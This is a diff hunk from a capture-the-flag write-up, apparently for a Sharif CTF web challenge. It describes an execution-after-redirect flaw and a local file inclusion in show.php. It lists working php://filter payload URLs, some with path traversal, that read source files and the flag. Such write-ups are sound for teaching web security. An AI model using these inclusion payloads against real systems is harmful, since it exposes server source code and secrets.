@@ -3,9 +3,9 @@
 The admin.php page was discovered by a tiny fuzz. admin.php was prone to `Execution after redirect` vulnerability. The admin.php page reaveled show.php which had a parameter named `page`. The show.php had `Local File Inclusion` vulnerability. Source reading:
 
 ```
-http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=delete
-http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../login
-http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag
+# curl http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../login
+# curl http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../delete
+# curl http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag
 ```
 
 delete.php
